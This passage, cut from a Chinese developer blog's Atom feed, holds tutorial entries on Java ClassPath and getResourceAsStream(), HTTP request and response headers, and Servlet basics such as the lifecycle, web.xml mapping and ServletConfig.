&lt;p&gt;JSP（全称为 JavaServer Pages）是由 Sun 公司主导建立的一种</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="JSP" scheme="https://xorex.space/tags/JSP/"/>
    
  </entry>
  
  <entry>
    <title>ClassPath 和 getResourceAsStream()</title>
    <link href="https://xorex.space/2021/03/30/34a1ace02353/"/>
    <id>https://xorex.space/2021/03/30/34a1ace02353/</id>
    <published>2021-03-30T03:49:38.000Z</published>
    <updated>2021-03-31T13:26:57.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ClassPath"><a href="#ClassPath" class="headerlink" title="ClassPath"></a>ClassPath</h2><blockquote><p>Classpath 是 Java 虚拟机或 Java 编译器中的参数，用于指定用户定义的类和包的位置。</p></blockquote><h3 id="普通本地项目的-ClassPath"><a href="#普通本地项目的-ClassPath" class="headerlink" title="普通本地项目的 ClassPath"></a>普通本地项目的 ClassPath</h3><p>Java 的运行是先运行 <code>javac.exe</code> 先将 <code>.java</code> 代码编译成 <code>.class</code> 字节码文件，然后运行 <code>java.exe</code> 启动 JVM ，然后 JVM 调用自己的 ClassLoader 类加载器读取 <code>.class</code> 文件，然后处理文件为内存中的 Class 类，这样无论是实例化还是执行就都没问题了。</p><p>但是 ClassLoader 去哪里找 <code>.class</code> 文件呢？那就是 ClassPath。而需要加载的 <code>.class</code> 文件除了我们自己写的 java 代码编译出来的以外，还有我们引用的外部的核心类的 <code>.class</code> 文件。对于外部核心类，我们通过设置环境变量中的 <code>classpath=XXXXXX</code> 将核心类的文件位置告诉 ClassLoader。至于我们自己写的 java 代码的 <code>.class</code> 文件位置，则由 IDEA 在代替我们运行 java.exe 文件的时候，传入了 <code>-cp XXXX</code> 参数，告诉了 ClassLoader 位置。</p><p>而 IDEA 增加的参数的地址在一个本地的普通工程中是固定的，那就是工程中的 Out\Production\ProjectName 文件夹里面。这个文件夹里面存储的就是编译好的 <code>.class</code> 文件。所以 Out\Production\ProjectName 也属于 ClassPath 的一部分。</p><h3 id="Web-项目的-ClassPath"><a href="#Web-项目的-ClassPath" class="headerlink" title="Web 项目的 ClassPath"></a>Web 项目的 ClassPath</h3><p>对于我们正在开发的 Web 项目来说，文件结构就会复杂很多了。首先是开发本地的文件，我们写 Java 代码的文件结构是这样的：</p><p><img src="https://xorex.space/image/207.jpg"></p><p>首先 main/java 和 test/java 下面的都是我们开发的时候编写的 <code>.java</code> 文件存储的位置，而 main/resource 和 test/resource 分别是业务代码和测试代码运行时所需要的资源的存放位置。 main/webapp 目录里面则是放置着 Web 应用所需要的文件资源（html，css，jsp，js 等），需要注意的是 main/webapp/WEB-INF 文件夹比较特殊，这个文件夹用于存储禁止用户访问的资源内容，只要 Web 应用需要，但是不想让用户访问到，就需要放置到这个文件夹下面。</p><p>上面就是我们在开发应用的时候，本地的一个项目结构了。但是我们开发的东西是最终需要部署到服务器上面的，肯定不会直接放置我们的开发文件（都是 <code>.java</code>文件无法运行），所以和上面的本地普通工程一样，需要有一个放置成品的文件夹，那就是 Target 文件夹，里面自动生成了所有被开发的成品。而其中文件夹名字和我们的项目名一样的那个文件夹，就是我们最终需要部署的 Web 应用了。</p><p><img src="https://xorex.space/image/208.jpg"></p><p>而这个 Web 应用成品的生成逻辑是这样的：首先开发区的 webapp 里面的东西会直接平移到成品文件夹里面（各种 Web 资源 html，css，jsp，js 等）。然后将开发区的 main/java 文件夹下面的所有 <code>.java</code> 文件编译成 <code>.class</code> 文件，然后和 main/resource 文件夹里面的资源一起按照原有的结构和放到 WEB-INF/classes 文件夹里面 (java+resource-&gt;classes) 。然后将 Maven 里面记录的依赖全部下载到 WEB-INF/lib 文件夹里面，供运行 classes 里面的字节码的时候调用。</p><p>这也是对应 Tomcat 的一个 Web 应用应该有的目录结构：<a href="https://xorex.space/2021/03/27/9234b0350059/#Java-Web-%E5%BA%94%E7%94%A8%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">Tomcat 应用目录结构</a></p><p>那么这里 Web 应用里面的 ClassPath 也就一目了然了， <code>BookStore/WEB-INF/classes</code> 和 <code>BookStore/WEB-INF/lib</code>。</p><h2 id="getResourceAsStream"><a href="#getResourceAsStream" class="headerlink" title="getResourceAsStream()"></a>getResourceAsStream()</h2><p>这个方法都是用来读取一个文件，调用后返回读取这个文件的 InputStream 对象，用于获取数据。</p><h3 id="使用-Class-类的方法"><a href="#使用-Class-类的方法" class="headerlink" title="使用 Class 类的方法"></a>使用 Class 类的方法</h3><p><code>this.getClass().getResourceAsStream(String file);</code> 这里是通过 Class 类来调用出来这个方法。当传入的文件路径开头加上了 <code>/</code> 之后，会以 ClassPath 为根路径去寻找资源。当传入的文件路径没有 <code>/</code> 的时候，则从 <strong>此类所在的包</strong> 下面去寻找资源</p><h3 id="使用-ClassLoader-类的方法"><a href="#使用-ClassLoader-类的方法" class="headerlink" title="使用 ClassLoader 类的方法"></a>使用 ClassLoader 类的方法</h3><p><code>this.getClass().getClassLoader().getResourceAsStream(String file);</code> 这里是通过类加载器 ClassLoader 类来调用这个方法，传入的参数不允许开头加上 <code>/</code> ，默认是以 ClassPath 为根路径去寻找资源。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ClassPath&quot;&gt;&lt;a href=&quot;#ClassPath&quot; class=&quot;headerlink&quot; title=&quot;ClassPath&quot;&gt;&lt;/a&gt;ClassPath&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Classpath 是 Java 虚拟机或 Java 编译</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="ClassPath" scheme="https://xorex.space/tags/ClassPath/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 的请求与响应</title>
    <link href="https://xorex.space/2021/03/29/9fe744b92f15/"/>
    <id>https://xorex.space/2021/03/29/9fe744b92f15/</id>
    <published>2021-03-29T05:57:37.000Z</published>
    <updated>2021-04-13T08:21:55.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h2><h3 id="HTTP-版本"><a href="#HTTP-版本" class="headerlink" title="HTTP 版本"></a>HTTP 版本</h3><ol><li><p>HTTP 1.0 一次连接只能获取一个资源</p></li><li><p>HTTP 1.1 一次连接可以获取多个资源</p></li></ol><h3 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h3><p>请求的结构：</p><p><img src="https://xorex.space/image/205.jpg"></p><p>请求行包括：请求方式 请求资源名称 使用协议版本。注意这里的请求资源名称里面是会包含 <code>?XXX=XXX&amp;XXX=XXX</code> 这样的 GET 请求参数的。然后下面的请求实体会可能会包含 POST 请求参数 <code>XXX=XXX&amp;XXX=XXX</code> 。</p><p>常用请求头：</p><h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p><code>Accept: text/html</code> 浏览器可以接受服务器回发的类型为 text/html。</p><p><code>Accept: */*</code> 代表浏览器可以处理所有类型,(一般浏览器发给服务器都是发这个)。</p><h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h4><p><code>Accept-Encoding: gzip, deflate</code> 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate），注意：这不是只字符编码。</p><h4 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h4><p><code>Accept-Language: zh-CN, zh; q=0.9</code>  浏览器申明自己接收的语言。</p><h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><p><code>Connection: keep-alive</code> 当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接。</p><p><code>Connection: close</code> 代表一个 Request 完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接会关闭， 当客户端再次发送 Request，需要重新建立 TCP 连接。</p><h4 id="Host（发送请求时，该报头域是必需的）"><a href="#Host（发送请求时，该报头域是必需的）" class="headerlink" title="Host（发送请求时，该报头域是必需的）"></a>Host（发送请求时，该报头域是必需的）</h4><p><code>Host: www.baidu.com</code> 请求报头域主要用于指定被请求资源的 Internet 主机和端口号，它通常从HTTP URL中提取出来的。</p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p><code>Referer: https://www.baidu.com/?tn=62095104_8_oem_dg</code> 当浏览器向web服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。</p><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p><code>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36</code> 告诉HTTP服务器，客户端使用的操作系统和浏览器的名称和版本。</p><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><p><code>Cache-Control: private</code> 默认为 private  响应只能够作为私有的缓存，不能再用户间共享。</p><p><code>Cache-Control: public</code> 响应会被缓存，并且在多用户间共享。正常情况，如果要求 HTTP 认证，响应会自动设置为 private。</p><p><code>Cache-Control: must-revalidate</code> 响应在特定条件下会被重用，以满足接下来的请求，但是它必须到服务器端去验证它是不是仍然是最新的。</p><p><code>Cache-Control: no-cache</code> 响应不会被缓存，而是实时向服务器端请求资源。</p><p><code>Cache-Control: max-age=10</code> 设置缓存最大的有效时间，但是这个参数定义的是时间大小（比如：60）而不是确定的时间点。单位是[秒 seconds]。</p><p><code>Cache-Control: no-store</code> 在任何条件下，响应都不会被缓存，并且不会被写入到客户端的磁盘里，这也是基于安全考虑的某些敏感的响应才会使用这个。</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p><code>Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXX</code> 是用来存储一些用户信息以便让服务器辨别用户身份的（大多数需要登录的网站上面会比较常见），比如 cookie 会存储一些用户的用户名和密码，当用户登录后就会在客户端产生一个 cookie 来存储相关信息，这样浏览器通过读取 cookie 的信息去服务器上验证并通过后会判定你是合法用户，从而允许查看相应网页。当然 cookie 里面的数据不仅仅是上述范围，还有很多信息可以存储是 cookie 里面，比如 sessionid 等。</p><h4 id="Range（用于断点续传）"><a href="#Range（用于断点续传）" class="headerlink" title="Range（用于断点续传）"></a>Range（用于断点续传）</h4><p><code>Range: bytes=0-5</code> 指定第一个字节的位置和最后一个字节的位置。用于告诉服务器自己想取对象的哪部分。</p><h3 id="HTTP-响应"><a href="#HTTP-响应" class="headerlink" title="HTTP 响应"></a>HTTP 响应</h3><p><img src="https://xorex.space/image/206.jpg"></p><p>状态行包括：通信协议 状态代码 状态信息</p><p>常见状态代码和状态信息：<a href="https://www.w3school.com.cn/tags/html_ref_httpmessages.asp">响应代码和状态信息手册</a></p><h4 id="Cache-Control（对应请求中的Cache-Control）"><a href="#Cache-Control（对应请求中的Cache-Control）" class="headerlink" title="Cache-Control（对应请求中的Cache-Control）"></a>Cache-Control（对应请求中的Cache-Control）</h4><p><code>Cache-Control: private</code> 默认为private  响应只能够作为私有的缓存，不能再用户间共享。</p><p><code>Cache-Control: public</code> 浏览器和缓存服务器都可以缓存页面信息。</p><p><code>Cache-Control: must-revalidate</code> 对于客户机的每次请求，代理服务器必须想服务器验证缓存是否过时。</p><p><code>Cache-Control: no-cache</code> 浏览器和缓存服务器都不应该缓存页面信息。</p><p><code>Cache-Control: max-age=10</code> 是通知浏览器10秒之内不要烦我，自己从缓冲区中刷新。</p><p><code>Cache-Control: no-store</code> 请求和响应的信息都不应该被存储在对方的磁盘系统中。</p><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><p><code>Content-Type：text/html; charset=UTF-8</code> 告诉客户端，资源文件的类型，还有字符编码，客户端通过 UTF-8 对资源进行解码，然后对资源进行 HTML 解析。通常我们会看到有些网站是乱码的，往往就是服务器端没有返回正确的编码。</p><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h4><p><code>Content-Encoding: gzip</code> 告诉客户端，服务端发送的资源是采用 gzip 编码的，客户端看到这个信息后，应该采用 gzip 对资源进行解码。</p><h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p><code>Date: Tue, 03 Apr 2018 03:52:28 GMT</code> 这个是服务端发送资源时的服务器时间，GMT 是格林尼治所在地的标准时间。HTTP 协议中发送的时间都是 GMT 的，这主要是解决在互联网上，不同时区在相互请求资源的时候，时间混乱问题。</p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p><code>Server：Tengine/1.4.6</code>  这个是服务器和相对应的版本，只是告诉客户端服务器信息。</p><h4 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h4><p><code>Transfer-Encoding：chunked</code> 这个响应头告诉客户端，服务器发送的资源的方式是分块发送的。一般分块发送的资源都是服务器动态生成的，在发送时还不知道发送资源的大小，所以采用分块发送，每一块都是独立的，独立的块都能标示自己的长度，最后一块是0长度的，当客户端读到这个0长度的块时，就可以确定资源已经传输完了。</p><h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><p><code>Expires: Sun, 1 Jan 2000 01:00:00 GMT</code> 这个响应头也是跟缓存有关的，告诉客户端在这个时间前，可以直接访问缓存副本，很显然这个值会存在问题，因为客户端和服务器的时间不一定会都是相同的，如果时间不同就会导致问题。所以这个响应头是没有 <code>Cache-Control：max-age=*</code> 这个响应头准确的，因为 max-age=date 中的 date 是个相对时间，不仅更好理解，也更准确。</p><h4 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h4><p><code>Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT</code> 所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</p><h4 id="Connection-1"><a href="#Connection-1" class="headerlink" title="Connection"></a>Connection</h4><p><code>Connection：keep-alive</code> 这个字段作为回应客户端，告诉客户端服务器的 TCP 连接也是一个长连接，客户端可以继续使用这个 TCP 连接发送 HTTP 请求。</p><h4 id="Etag"><a href="#Etag" class="headerlink" title="Etag"></a>Etag</h4><p><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code> 就是一个对象（比如 URL ）的标志值，就一个对象而言，比如一个 HTML 文件，如果被修改了，其 Etag 也会别修改，所以，ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 HTML 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</p><h4 id="Refresh"><a href="#Refresh" class="headerlink" title="Refresh"></a>Refresh</h4><p><code>Refresh: 5; url=http://baidu.com</code> 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。</p><h4 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h4><p><code>Access-Control-Allow-Origin: *</code> * 号代表所有网站可以跨域资源共享，如果当前字段为 * 那么 Access-Control-Allow-Credentials 就不能为 true。</p><p><code>Access-Control-Allow-Origin: www.baidu.com</code> 指定哪些网站可以跨域资源共享</p><h4 id="Access-Control-Allow-Methods"><a href="#Access-Control-Allow-Methods" class="headerlink" title="Access-Control-Allow-Methods"></a>Access-Control-Allow-Methods</h4><p><code>Access-Control-Allow-Methods：GET, POST, PUT, DELETE</code> 允许哪些方法来访问</p><h4 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h4><p><code>Access-Control-Allow-Credentials: true</code> 是否允许发送 Cookie。默认情况下，Cookie 不包括在CORS 请求之中。设为 true，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true，如果服务器不要浏览器发送 Cookie，删除该字段即可。如果 access-control-allow-origin 为 *，当前字段就不能为 true。</p><h4 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h4><p><code>Content-Range: bytes 0-5/7877</code> 指定整个实体中的一部分的插入位置，他也指示了整个实体的长度。在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度。</p><h2 id="路径解析问题"><a href="#路径解析问题" class="headerlink" title="路径解析问题"></a>路径解析问题</h2><h3 id="base-标签"><a href="#base-标签" class="headerlink" title="base 标签"></a>base 标签</h3><p>在 HTML 种，有一个 base 标签的：<code>&lt;base herf=&quot;http://localhost:8080/WebModule/&quot;&gt;</code> 它可以定义相对路径跳转的前面部分，然后页面里面所有使用相对路径的跳转，都会加上 base 里面设置的 herf 组成一个绝对路径。</p><h3 id="的解析"><a href="#的解析" class="headerlink" title="/ 的解析"></a>/ 的解析</h3><p>对于服务器和客户端对相对路径的最前面的 <code>/</code> 解析是不同的，对于服务器来说这里会解析到当前 Servlet 所属的 Web 工程的目录，比如 <code>http://localhost:8080/WebModule/</code>，而对于客户端来说，会解析到当前主机的地址如 <code>http://localhost:8080/</code></p><h2 id="请求-HttpServletResquest"><a href="#请求-HttpServletResquest" class="headerlink" title="请求 HttpServletResquest"></a>请求 HttpServletResquest</h2><p>Tomcat 回将请求封装到 HttpServletResquest 类的实例中，并传入 service() 方法中，然后分流到 doPost() 和 doGet()。我们可以通过 HttpServletRequest 获取大量请求的相关信息。</p><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>一般来说，互联网上发送的各种数据都是使用 <code>UTF-8</code> 来编码的，但因为 Tomcat7 及以下版本默认使用 <code>iso-8859-1</code> 来解码使用 URL 传输的文字，导致对于 Get 请求来的信息会乱码，那么为了解决这个问题，有两种方式：</p><ol><li><p>设置 Tomcat 的 URL 解码方式为 <code>UTF-8</code>，在 server.xml 里面的 HTTP/1.1 的 <code>&lt;Connector&gt;</code> 标签里面加入属性： <code>URIEncoding=&quot;UTF-8&quot;</code>。</p></li><li><p>在通过 HttpServletResquest 获取 URL 中的中文信息（GET 参数）的时候，将获取的字符串用 <code>iso-8859-1</code> 编码为原本的 <code>UTF-8</code> byte[] 信息，然后再用 <code>UTF-8</code> 编码解码这些 byte[] 为 String 即可。</p></li></ol><p>对于 Post 比较简单，没有 Tomcat 乱解码，无脑标注使用 UTF-8 解码就可以了：<code>request.setCharacterEncoding(&quot;UTF-8&quot;);</code></p><h3 id="请求信息"><a href="#请求信息" class="headerlink" title="请求信息"></a>请求信息</h3><p>getXXXX() 系列，可以获取各种请求头和 Get / Post 参数：</p><p>其中对于一个 name 对应多个 value 的参数，需要使用 getgetParameterValues() 获取 String[]。</p><h3 id="设置传递信息"><a href="#设置传递信息" class="headerlink" title="设置传递信息"></a>设置传递信息</h3><p>在进行信息转发的时候，因为整个过程传递的都是一个 HttpServletResquest 对象，所以可以在当前 Servlet 存储入一些信息，让其他的 Servlet 可以从这个对象中获取信息。</p><p>具体的设置方法就是使用 <code>setAttribute(Name,Value)</code> 保存信息，然后在转发到的 Servlet使用 <code>getAttribute(Name)</code> 获取保存的信息。</p><h2 id="响应-HttpServletResponse"><a href="#响应-HttpServletResponse" class="headerlink" title="响应 HttpServletResponse"></a>响应 HttpServletResponse</h2><h3 id="编码-1"><a href="#编码-1" class="headerlink" title="编码"></a>编码</h3><p>首先对于要操作 HttpServletResponse 之前，先设置好编码：</p><ol><li><p>无脑推荐版本：使用 <code>setContentType(&quot;UTF-8&quot;)</code> 来设置。这个方法不仅设置了输出信息使用 UTF-8 编码，还自动会添加响应头 <code>Content-Type: text/html; charset=UTF-8</code> ，一步解决全部问题。</p></li><li><p>自己手动全部设置：先设置信息编码格式： <code>setCharactorEncoding(&quot;UTF-8&quot;)</code> 然后设置响应头：<code>setHeader(&quot;Content-Type&quot;,&quot;text/html; charset=UTF-8&quot;)</code> 这个比较麻烦，还是无脑用第一个吧。</p></li></ol><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>用一堆 set 方法设置响应头以外，就是输出响应体了。</p><p>响应体有两种方式：<code>getWriter()</code> <code>getOutputStream()</code> 获取 Write 实例和 OutputStream 实例来写响应体。</p><p>对于字符，可以使用 Write 来写，对于非字符（二进制文件）使用 OutputStream 来写。但是一定要注意的的是，这两个东西，只能同时持有一个实例，如果要用另一个，就需要 <code>close()</code> 关闭资源才可以。</p><p>这是因为如果同时持有两个输出实例，那么两者的输出合并就会成为一个大问题，所以为了避免混乱，就设计成两者互斥，只能同时持有一个输出实例。</p><h3 id="请求重定向"><a href="#请求重定向" class="headerlink" title="请求重定向"></a>请求重定向</h3><ol><li><p>无脑推荐： <code>sendRedirect(/XXX/XX)</code> 里面填入重定向页面。（会自动设置响应代码和重定向响应头）</p></li><li><p>自己手动设置响应代码和重定向头： <code>setStatus(302)</code> <code>setHeader(&quot;Location&quot;,&quot;XXX/XX&quot;)</code></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HTTP-协议&quot;&gt;&lt;a href=&quot;#HTTP-协议&quot; class=&quot;headerlink&quot; title=&quot;HTTP 协议&quot;&gt;&lt;/a&gt;HTTP 协议&lt;/h2&gt;&lt;h3 id=&quot;HTTP-版本&quot;&gt;&lt;a href=&quot;#HTTP-版本&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="HTTP" scheme="https://xorex.space/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Servlet 开发基础</title>
    <link href="https://xorex.space/2021/03/28/1febb3ac708c/"/>
    <id>https://xorex.space/2021/03/28/1febb3ac708c/</id>
    <published>2021-03-28T08:10:17.000Z</published>
    <updated>2021-03-29T05:56:48.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Servlet-简介"><a href="#Servlet-简介" class="headerlink" title="Servlet 简介"></a>Servlet 简介</h2><p>狭义上的 Servlet 是一种接口，如果开发者想要开发一个动态的 Web 资源，只需要：</p><ol><li><p>编写一个实现了 Servlet 接口的类。</p></li><li><p>把开发好的 Java 类部署到服务器中。</p></li></ol><p>广义上来讲，我们就把实现了 Servlet 接口的程序也称之为一个 Servlet。</p><h2 id="Servlet-生命周期"><a href="#Servlet-生命周期" class="headerlink" title="Servlet 生命周期"></a>Servlet 生命周期</h2><p>当服务器接收到了某个 Servlet 程序的请求的时候，会执行以下过程：</p><ol><li><p>服务器会先判断是否拥有当前 Servlet 实例，如果有，跳到第四步。</p></li><li><p>调用 Servlet 的构造方法实例化 Servlet 获取对象。</p></li><li><p>调用 Servlet 实例的 init() 方法来初始化此对象。</p></li><li><p>创建此 HTTP 请求的 ServletRequest 和 ServletResponse 实例，并传入调用的 service(ServletRequest,ServletResponse) 方法。</p></li><li><p>当 Web 程序停止/重启，会调用对应实例的 destroy() 方法</p></li></ol><h2 id="创建-Servlet"><a href="#创建-Servlet" class="headerlink" title="创建 Servlet"></a>创建 Servlet</h2><p>我们在创建一个 Servlet 类的时候，一般会直接继承 HttpServlet ，里面提供了很多强大的功能，它已经写好了 service() 方法，并对请求分流到 doGet() 和 doPost() 方法。所以我们只需要重写这两个方法来分别处理 Get 和 Post 请求即可。</p><p>创建 Servlet 之后，需要进行 Servlet-URL 进行映射，来确定在访问哪些 URL 的时候，让对应的 Servlet 去处理。这里有两种方法，一种是在 IDEA 创建 Servlet 的 Java 文件的时候，勾选 <code>Create Java EE 6+ Annotated class</code> 选项使用注解来注册 Servlet ，然后生成的 Servlet 代码的类前面会有注解： <code>@WebServlet(name = &quot;XXXX&quot;, value = &quot;XXXX&quot;)</code> name 表示 Servlet 服务名称，value 表示对应映射的 URL。</p><p>或者不勾选哪个选项，然后自己在 web.xml 配置文件中添加 servlet 信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span> <span class="comment">&lt;!-- 这里注册 servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServletName<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span> <span class="comment">&lt;!-- 这里填写自己设置的 Servlet 名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>space.xorex.WebModule.MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span> <span class="comment">&lt;!-- 这里填写 Servlet 类的完整类名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span> <span class="comment">&lt;!-- 这里映射 servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>NewServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span> <span class="comment">&lt;!-- 填写 servlet 名称，要和上面注册的相同 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/New<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span> <span class="comment">&lt;!-- 这里填写映射的 URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里创建映射的时候，可以使用通配符 * ,比如 <code>/*</code> 和 <code>/XXXX/*.txt</code> 等等。而对于一个路径有多个 Servlet 对应，那么路径映射返回越大的 Servlet 优先级越低。</p><hr><p>如果有路径映射为 <code>/</code> 的 Servlet，那么这个 Servlet 就会成为默认 Servlet，所有找不到路径映射的访问都会指向这个 Servlet 去处理。</p><h2 id="Servlet-线程安全"><a href="#Servlet-线程安全" class="headerlink" title="Servlet 线程安全"></a>Servlet 线程安全</h2><p>需要注意，一个 Servlet 程序在运行中只会创建一个实例，所以面对并发访问的时候，Tomcat 会创建新的线程去运行 service() 方法，但所有线程运行的 service() 都是属于同一个 Servlet 对象的。所以一旦涉及到非 service() 方法本地的访问与调用，就有可能牵扯到线程安全问题。</p><p>所以一定要小心 service() doGet() doPost() 方法所有的外部调用，避免出现线程安全问题，</p><h2 id="ServletConfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h2><p>在 web.xml 文件的 servlet 标签下面可以设置此 Servlet 程序的初始化配置参数 <code>&lt;init-param&gt;</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>Tempest<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Xorex<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>Yukinoshita<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Yukino<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后可以调用 父类 GenericServlet 的方法 getServletConfig() 获取一个 ServletConfig 实例，此实例的 getInitParameterNames() 和 getInitParameter() 可以获取 Servlet 配置里面的初始化参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showInitPara</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ServletConfig config=getServletConfig();</span><br><span class="line">    Enumeration&lt;String&gt; paras = config.getInitParameterNames();</span><br><span class="line">    <span class="keyword">while</span>(paras.hasMoreElements()) &#123;</span><br><span class="line">        String name=paras.nextElement();</span><br><span class="line">        System.out.println(name + <span class="string">&quot; : &quot;</span> + config.getInitParameter(name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h2><h3 id="概念"><a href="#概念" class="headerlink" 